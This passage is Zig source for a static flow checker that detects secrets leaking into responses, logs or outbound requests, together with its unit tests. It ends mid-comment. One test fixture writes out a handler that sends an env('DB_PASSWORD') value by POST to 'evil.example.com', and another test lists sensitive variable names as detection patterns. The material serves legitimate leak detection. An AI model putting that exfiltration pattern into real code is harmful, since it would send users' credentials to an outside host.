                const binding = self.ir_view.getBinding(cond) orelse return null;
                const key = packBindingKey(binding.scope_id, binding.slot);
                const meta = self.binding_origin.get(key) orelse return null;
                return .{ .stub_truthy = .{
                    .module = meta.module,
                    .func = meta.func,
                    .returns = meta.returns,
                    .call_index = meta.call_index,
                } };
            },
            .unary_op => {
                const unary = self.ir_view.getUnary(cond) orelse return null;
                if (unary.op != .not) return null;
                const inner = self.extractCondConstraint(unary.operand) orelse return null;
                return counterexample.negate(inner);
            },
            .binary_op => {
                const bin = self.ir_view.getBinary(cond) orelse return null;
                if (bin.op != .strict_eq and bin.op != .strict_neq) return null;

                const raw = self.extractLiteralReqComparison(bin.left, bin.right) orelse
                    self.extractLiteralReqComparison(bin.right, bin.left) orelse
                    return null;
                return if (bin.op == .strict_eq) raw else counterexample.negate(raw);
            },
            .member_access => {
                return self.extractResultOkConstraint(cond);
            },
            else => return null,
        }
    }

    /// Recognise `req.method === "POST"` / `req.url === "/path"` shapes
    /// (either direction). Handles only direct property access on the
    /// request binding; `const method = req.method` indirection would
    /// need a second binding_origin track and is a follow-up.
    fn extractLiteralReqComparison(
        self: *FlowChecker,
        prop_node: NodeIndex,
        lit_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const lit_tag = self.ir_view.getTag(lit_node) orelse return null;
        if (lit_tag != .lit_string) return null;
        const str_idx = self.ir_view.getStringIdx(lit_node) orelse return null;
        const value = self.ir_view.getString(str_idx) orelse return null;

        if (self.isReqProperty(prop_node, "method")) {
            return .{ .req_method = value };
        }
        if (self.isReqProperty(prop_node, "url") or self.isReqProperty(prop_node, "path")) {
            return .{ .req_url = value };
        }
        return null;
    }

    /// Recognise `result.ok` where `result` is an identifier bound to a
    /// Result-returning module call (validateJson, jwtVerify, etc.).
    fn extractResultOkConstraint(
        self: *FlowChecker,
        member_node: NodeIndex,
    ) ?counterexample.WitnessConstraint {
        const member = self.ir_view.getMember(member_node) orelse return null;
        const prop_name = self.resolveAtomName(member.property) orelse return null;
        if (!std.mem.eql(u8, prop_name, "ok")) return null;

        const obj_tag = self.ir_view.getTag(member.object) orelse return null;
        if (obj_tag != .identifier) return null;
        const binding = self.ir_view.getBinding(member.object) orelse return null;
        const key = packBindingKey(binding.scope_id, binding.slot);
        const meta = self.binding_origin.get(key) orelse return null;
        if (meta.returns != .result) return null;

        return .{ .result_ok = .{
            .module = meta.module,
            .func = meta.func,
            .returns = meta.returns,
            .call_index = meta.call_index,
        } };
    }

    fn resolveAtomName(self: *const FlowChecker, atom_idx: u16) ?[]const u8 {
        if (self.atoms) |table| {
            const atom: object.Atom = @enumFromInt(atom_idx);
            if (atom.toPredefinedName()) |name| return name;
            return table.getName(atom);
        }
        if (self.ir_view.getString(atom_idx)) |name| return name;
        const atom: object.Atom = @enumFromInt(atom_idx);
        return atom.toPredefinedName();
    }
};

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

test "FlowChecker captures witness constraints on secret-in-response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (secret) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    // Expect exactly one secret-in-response diagnostic, carrying a
    // stub_truthy constraint on the env call and a tracked env I/O call.
    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        try std.testing.expectEqual(
            counterexample.PropertyTag.no_secret_leakage,
            propertyTagForKind(d.kind).?,
        );
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
        try std.testing.expect(w.io_calls.len >= 1);
        try std.testing.expectEqualStrings("env", w.io_calls[0].func);
    }
    try std.testing.expect(found);
}

test "FlowChecker does not leak sibling-branch I/O calls into the witness" {
    // If a module call happens inside the branch that does NOT reach the
    // sink, the fall-through sink's witness must not include it - otherwise
    // the synthesised stub sequence would drive the handler down the wrong
    // path. Regression test for the shrinkRetainingCapacity fix around
    // `.if_stmt` in walkStmt.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\import { cacheGet } from "zigttp:cache";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (!secret) {
        \\    const cached = cacheGet("sibling");
        \\    return Response.json({ ok: cached });
        \\  }
        \\  return Response.json({ leaked: secret });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        for (w.io_calls) |call| {
            // `cacheGet` is only called on the sibling branch that returns
            // without leaking. It must not appear in this witness.
            try std.testing.expect(!std.mem.eql(u8, call.func, "cacheGet"));
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker captures stub_truthy on if-else with negated condition" {
    // `if (!secret) { ok } else { leak }` - the else branch's effective
    // constraint is the double-negation of !secret, i.e. secret truthy.
    // Exercises the `.unary_op` arm of `extractCondConstraint`.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (!secret) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);

    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .stub_truthy);
        try std.testing.expectEqualStrings("env", w.path_constraints[0].stub_truthy.func);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures req_method constraint from literal comparison" {
    // `if (req.method === "POST") { leak }` - the witness request must be
    // POST, not the default GET, so the handler reaches the sink.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST") {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method);
        try std.testing.expectEqualStrings("POST", w.path_constraints[0].req_method);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures AND chain as multiple constraints" {
    // `if (req.method === "POST" && secret) { leak }` produces TWO
    // constraints: the method literal and the env truthiness. The solver
    // turns this into a POST request whose env stub returns truthy.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "POST" && secret) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.path_constraints.len);

        var saw_method = false;
        var saw_truthy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .req_method => |m| {
                    try std.testing.expectEqualStrings("POST", m);
                    saw_method = true;
                },
                .stub_truthy => |info| {
                    try std.testing.expectEqualStrings("env", info.func);
                    saw_truthy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_method and saw_truthy);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures one concrete negated request constraint for else AND path" {
    // `!(req.method === "GET" && secret)` should use one concrete false
    // clause. Pick a non-GET method and leave the env call on its default
    // truthy stub so replay still leaks the sentinel secret.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  if (req.method === "GET" && secret) {
        \\    return Response.json({ ok: true });
        \\  } else {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 1), w.path_constraints.len);
        try std.testing.expect(w.path_constraints[0] == .req_method_not);
        try std.testing.expectEqualStrings("GET", w.path_constraints[0].req_method_not);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("POST", witness.request.method);
        try std.testing.expectEqual(@as(usize, 1), witness.io_stubs.len);
        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker keeps repeated module call constraints tied to call index" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const a = env("SECRET_A");
        \\  const b = env("SECRET_B");
        \\  if (a) {
        \\    if (!b) {
        \\      return Response.json({ leaked: a });
        \\    }
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        try std.testing.expectEqual(@as(usize, 2), w.io_calls.len);

        var saw_a_truthy = false;
        var saw_b_falsy = false;
        for (w.path_constraints) |c| {
            switch (c) {
                .stub_truthy => |info| {
                    try std.testing.expectEqual(@as(?u32, 0), info.call_index);
                    saw_a_truthy = true;
                },
                .stub_falsy => |info| {
                    try std.testing.expectEqual(@as(?u32, 1), info.call_index);
                    saw_b_falsy = true;
                },
                else => return error.UnexpectedConstraintKind,
            }
        }
        try std.testing.expect(saw_a_truthy and saw_b_falsy);

        var witness = try counterexample.solve(allocator, .{
            .property = .no_secret_leakage,
            .origin = .{ .line = 1, .column = 1 },
            .sink = .{ .line = 1, .column = 1 },
            .summary = "t",
            .constraints = w.path_constraints,
            .io_calls = w.io_calls,
        });
        defer witness.deinit(allocator);

        try std.testing.expectEqualStrings("\"secret-sentinel\"", witness.io_stubs[0].result_json);
        try std.testing.expectEqualStrings("null", witness.io_stubs[1].result_json);
    }
    try std.testing.expect(found);
}

test "FlowChecker captures result_ok constraint on validated path" {
    // `if (r.ok) { leak(env()) }` - the witness must make validateJson
    // return an ok Result so the sink is reachable.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\import { validateJson } from "zigttp:validate";
        \\function handler(req) {
        \\  const secret = env("SECRET_KEY");
        \\  const r = validateJson(0, "{}");
        \\  if (r.ok) {
        \\    return Response.json({ leaked: secret });
        \\  }
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDiagnostics()) |d| {
        if (d.kind != .secret_in_response) continue;
        found = true;
        const w = d.witness orelse return error.MissingWitness;
        var saw_result_ok = false;
        for (w.path_constraints) |c| {
            if (c == .result_ok) {
                try std.testing.expectEqualStrings("validateJson", c.result_ok.func);
                saw_result_ok = true;
            }
        }
        try std.testing.expect(saw_result_ok);
    }
    try std.testing.expect(found);
}

test "FlowChecker records validated defended path reaching egress body" {
    const allocator = std.testing.allocator;
    const source =
        \\import { validateObject } from "zigttp:validate";
        \\function handler(req) {
        \\  const v = validateObject(req.body, "{}");
        \\  fetchSync("https://api.example.com", { method: "POST", body: v.value });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var saw_injection = false;
    var saw_input_validated = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            saw_injection = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("validateObject", d.guard_func.?);
        }
        if (d.property == .input_validated) saw_input_validated = true;
    }
    try std.testing.expect(saw_injection);
    try std.testing.expect(saw_input_validated);
    // The property itself must actually hold for the card to render.
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker flags a secret reaching a module fetch body" {
    // Regression: the egress sink check recognized only the bare `fetchSync`
    // global, so a secret sent via the documented `zigttp:fetch` API was not
    // flagged and no_secret_leakage was falsely proven.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zigttp:fetch";
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("DB_PASSWORD");
        \\  fetch("https://evil.example.com", { method: "POST", body: secret });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker flags a secret reaching a module fetch query field" {
    // Regression: the new `query` init field is appended to the egress URL at
    // runtime, but inferObjectBodyLabels returned only the `body` value when a
    // body key was present, so a secret in `query` escaped every sink check and
    // no_secret_leakage was falsely proven and signed into the attestation.
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zigttp:fetch";
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const secret = env("UPSTREAM_KEY");
        \\  fetch("https://api.example.com/v1", { method: "POST", body: "hello", query: { key: secret } });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
}

test "FlowChecker proves no_secret_leakage for a benign module fetch" {
    // Negative control for the fix above: a module fetch carrying no secret
    // must still discharge no_secret_leakage (no false positive).
    const allocator = std.testing.allocator;
    const source =
        \\import { fetch } from "zigttp:fetch";
        \\function handler(req) {
        \\  fetch("https://api.example.com", { method: "POST", body: "hello" });
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(checker.getProperties().no_secret_leakage);
}

test "FlowChecker records validated defended path reaching an HTML response" {
    const allocator = std.testing.allocator;
    const source =
        \\import { escapeHtml } from "zigttp:text";
        \\function handler(req) {
        \\  const raw = req.headers.get("x-name");
        \\  const safe = escapeHtml(raw);
        \\  return Response.html(safe);
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .injection_safe) {
            found = true;
            try std.testing.expectEqual(SafeForm.validated, d.safe_form);
            try std.testing.expect(d.guard_func != null);
            try std.testing.expectEqualStrings("escapeHtml", d.guard_func.?);
        }
    }
    try std.testing.expect(found);
    try std.testing.expect(checker.getProperties().injection_safe);
}

test "FlowChecker records never_reached defended path for unused secret" {
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ ok: true });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    var found = false;
    for (checker.getDefendedPaths()) |d| {
        if (d.property == .no_secret_leakage) {
            found = true;
            try std.testing.expectEqual(SafeForm.never_reached, d.safe_form);
            try std.testing.expect(d.guard_func == null);
        }
    }
    try std.testing.expect(found);
}

test "FlowChecker records no defended path for a leaking secret" {
    // A handler that actually leaks must not also claim a defended path for
    // the same property: violation and defended are mutually exclusive.
    const allocator = std.testing.allocator;
    const source =
        \\import { env } from "zigttp:env";
        \\function handler(req) {
        \\  const k = env("SECRET_KEY");
        \\  return Response.json({ leaked: k });
        \\}
    ;

    var parser = @import("parser/parse.zig").Parser.init(allocator, source);
    var atoms = context.AtomTable.init(allocator);
    defer atoms.deinit();
    parser.setAtomTable(&atoms);
    defer parser.deinit();
    const root = try parser.parse();
    const ir_view = IrView.fromIRStore(&parser.nodes, &parser.constants);
    const handler_verifier = @import("handler_verifier.zig");
    const handler_fn = handler_verifier.findHandlerFunction(ir_view, root) orelse
        return error.HandlerNotFound;

    var checker = FlowChecker.init(allocator, ir_view, &atoms);
    defer checker.deinit();
    _ = try checker.check(handler_fn);

    try std.testing.expect(!checker.getProperties().no_secret_leakage);
    for (checker.getDefendedPaths()) |d| {
        try std.testing.expect(d.property != .no_secret_leakage);
    }
}

test "LabelSet operations in flow context" {
    // Verify secret + credential merge
    const secret = LabelSet{ .secret = true };
    const cred = LabelSet{ .credential = true };
    const merged = LabelSet.merge(secret, cred);
    try std.testing.expect(merged.has(.secret));
    try std.testing.expect(merged.has(.credential));
    try std.testing.expect(!merged.has(.user_input));
}

test "isSensitiveEnvName" {
    try std.testing.expect(FlowChecker.isSensitiveEnvName("DB_PASSWORD"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("API_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("JWT_SECRET"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("ACCESS_TOKEN"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("PRIVATE_KEY"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("db_password"));
    try std.testing.expect(FlowChecker.isSensitiveEnvName("Auth_Header"));

    try std.testing.expect(!FlowChecker.isSensitiveEnvName("APP_NAME"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("PORT"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("NODE_ENV"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("LOG_LEVEL"));
    try std.testing.expect(!FlowChecker.isSensitiveEnvName("DATABASE_URL"));
}

test "FlowProperties defaults to all proven" {
    const props = FlowProperties{};
    try std.testing.expect(props.no_secret_leakage);
    try std.testing.expect(props.no_credential_leakage);
    try std.testing.expect(props.input_validated);
    try std.testing.expect(props.pii_contained);
}

test "parseDataLabel maps all known strings" {
    try std.testing.expectEqual(DataLabel.secret, parseDataLabel("secret").?);
    try std.testing.expectEqual(DataLabel.credential, parseDataLabel("credential").?);
    try std.testing.expectEqual(DataLabel.user_input, parseDataLabel("user_input").?);
    try std.testing.expectEqual(DataLabel.config, parseDataLabel("config").?);
    try std.testing.expectEqual(DataLabel.internal, parseDataLabel("internal").?);
    try std.testing.expectEqual(DataLabel.external, parseDataLabel("external").?);
    try std.testing.expectEqual(DataLabel.validated, parseDataLabel("validated").?);
    try std.testing.expect(parseDataLabel("unknown_label") == null);
    try std.testing.expect(parseDataLabel("") == null);
}

test "parseExternalLabels with valid JSON" {
    const json =
        \\{
        \\  "labels": [
        \\    { "field": "User.email", "label": "secret", "reason": "PII field" },
        \\    { "field": "token", "label": "credential", "reason": "auth token" }
        \\  ]
        \\}
    ;
    const labels = try parseExternalLabels(std.testing.allocator, json);
    defer {
        for (labels) |l| {
            std.testing.allocator.free(l.field);
            std.testing.allocator.free(l.reason);
        }
        std.testing.allocator.free(labels);
    }

    try std.testing.expectEqual(@as(usize, 2), labels.len);
    try std.testing.expectEqualStrings("User.email", labels[0].field);
    try std.testing.expectEqual(DataLabel.secret, labels[0].label);
    try std.testing.expectEqualStrings("PII field", labels[0].reason);
    try std.testing.expectEqualStrings("token", labels[1].field);
    try std.testing.expectEqual(DataLabel.credential, labels[1].label);
    try std.testing.expectEqualStrings("auth token", labels[1].reason);
}

test "parseExternalLabels with empty labels array" {
    const json =
        \\{ "labels": [] }
    ;
    const labels = try parseExternalLabels(std.testing.allocator, json);
    defer std.testing.allocator.free(labels);

    try std.testing.expectEqual(@as(usize, 0), labels.len);
}

test "setExternalLabels registers short form from qualified name" {
    // We cannot construct a full FlowChecker without a valid IrView,
    // so test the external label maps directly via a minimal instance.
    // The IrView is only used by check/walkStmt, not by setExternalLabels.
    var checker = FlowChecker.init(std.testing.allocator, undefined, null);
    defer {
        // Clean up only the maps we populated (skip ir_view-dependent deinit)
        var li = checker.external_labels.iterator();
        while (li.next()) |entry| checker.allocator.free(entry.key_ptr.*);
        checker.external_labels.deinit(checker.allocator);
        var ri = checker.external_reasons.iterator();
        while (ri.next()) |entry| {
            checker.allocator.free(entry.key_ptr.*);
            checker.allocator.free(entry.value_ptr.*);
        }
        checker.external_reasons.deinit(checker.allocator);
    }

    const ext = [_]ExternalLabel{
        .{ .field = "User.email", .label = .secret, .reason = "PII field" },
        .{ .field = "plainField", .label = .credential, .reason = "token data" },
    };
    checker.setExternalLabels(&ext);

    // Qualified name registered
    const email_labels = checker.external_labels.get("User.email").?;
    try std.testing.expect(email_labels.has(.secret));

    // Short form also registered
    const short_labels = checker.external_labels.get("email").?;
    try std.testing.expect(short_labels.has(.secret));

    // Non-qualified name registered directly (no dot, no short form duplication)
    const plain_labels = checker.external_labels.get("plainField").?;
    try std.testing.expect(plain_labels.has(.credential));

    // Reasons registered
    try std.testing.expectEqualStrings("PII field", checker.external_reasons.get("User.email").?);
    try std.testing.expectEqualStrings("PII field", checker.external_reasons.get("email").?);
    try std.testing.expectEqualStrings("token data", checker.external_reasons.get("plainField").?);
}

test "propertyTagForKind: every DiagnosticKind maps to the expected PropertyTag" {
    // Lock the current mapping. If a future change re-routes a flow-sink
    // category to a different property bucket, this assertion forces a
    // conscious update — without it, a silent mis-routing would weaken
    // the proven-property set in ways the existing flow tests would not
    // catch.
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_secret_leakage),
        propertyTagForKind(.secret_in_egress_body),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_response),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_log),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .no_credential_leakage),
        propertyTagForKind(.credential_in_egress_url),
    );
    try std.testing.expectEqual(
        @as(?counterexample.PropertyTag, .injection_safe),
        propertyTagForKind(.unvalidated_input_in_egress),
    );
}

test "propertyTagForKind: every DiagnosticKind variant maps to a non-null PropertyTag" {
    // Exhaustiveness lock. The per-variant assertions above pin the
    // current mapping; this test pins the more important invariant that
    // EVERY variant maps to something. Without it, a future maintainer
    // adding a new DiagnosticKind can satisfy Zig's switch exhaustiveness
    // with `else => null,` — both the compiler and the per-variant test
    // stay green while the new variant silently disappears from the
